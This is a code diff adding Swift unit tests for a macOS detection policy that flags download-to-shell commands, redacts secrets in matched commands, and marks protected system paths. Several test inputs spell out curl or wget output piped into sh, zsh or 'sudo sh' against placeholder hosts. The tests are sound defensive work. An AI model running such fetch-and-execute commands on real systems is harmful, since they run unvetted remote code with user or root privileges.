@@ -10,6 +10,48 @@ final class LOLBinExecutionPolicyTests: XCTestCase {
         XCTAssertEqual(finding.reason, "curl_pipe_shell")
         XCTAssertEqual(finding.severity, "critical")
         XCTAssertEqual(finding.title, "Download-to-shell command detected")
+        XCTAssertEqual(finding.matchedCommand, "curl https://example.invalid/safe | /bin/sh")
+    }
+
+    func test_downloadToShellFormsRequireConcreteShellDestination() throws {
+        let positives: [(String, [String])] = [
+            ("/bin/zsh", ["zsh", "-c", "wget -qO- https://example.test/x | zsh"]),
+            ("/bin/bash", ["bash", "-c", "$(curl -fsSL https://example.test/x)"]),
+            ("/bin/zsh", ["zsh", "-lc", "curl -s https://example.test/x | sudo sh"]),
+        ]
+        for (path, arguments) in positives {
+            XCTAssertNotNil(LOLBinExecutionPolicy.finding(executablePath: path, arguments: arguments))
+        }
+    }
+
+    func test_codexLikeParentNonShellPipelinesAreNotDownloadToShellEvidence() {
+        let actualSessionCommands = [
+            #"rg -n "curl_pipe_shell|Move to Trash" Nick NickTests | head -240"#,
+            #"rg -n "curl|wget" /Users/example/.zsh_history | tail -120"#,
+            #"jq -r '.payload.input' session.jsonl | rg -i 'curl|wget'"#,
+            #"shasum -a 256 fixture && rg -n 'curl' DOCS/5.0-progress.md"#,
+        ]
+        for command in actualSessionCommands {
+            XCTAssertNil(LOLBinExecutionPolicy.finding(
+                executablePath: "/bin/zsh",
+                arguments: ["/bin/zsh", "-lc", command]
+            ), command)
+        }
+    }
+
+    func test_emptyArgumentsCannotProduceDownloadToShellFinding() {
+        XCTAssertNil(LOLBinExecutionPolicy.finding(executablePath: "/bin/zsh", arguments: []))
+    }
+
+    func test_matchedCommandRedactsCommonSecrets() throws {
+        let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
+            executablePath: "/bin/zsh",
+            arguments: ["zsh", "-c", "curl https://user:password@example.test/x?token=secret | sh"]
+        ))
+        XCTAssertEqual(
+            finding.matchedCommand,
+            "curl https://<redacted>@example.test/x?token=<redacted> | sh"
+        )
     }
 
     func test_safeCurlAndInteractiveShellAreNotClassified() {
@@ -21,6 +63,12 @@ final class LOLBinExecutionPolicyTests: XCTestCase {
             executablePath: "/bin/zsh",
             arguments: ["zsh", "-l"]
         ))
+    }
+
+    func test_xpcQuarantinePolicyRefusesProtectedSystemShell() {
+        XCTAssertTrue(LOLBinExecutionPolicy.isProtectedSystemPath("/bin/zsh"))
+        XCTAssertTrue(LOLBinExecutionPolicy.isProtectedSystemPath("/usr/bin/curl"))
+        XCTAssertFalse(LOLBinExecutionPolicy.isProtectedSystemPath("/usr/local/bin/tool"))
     }
 
     func test_readOnlyXattrIsNotClassifiedButQuarantineRemovalIs() {
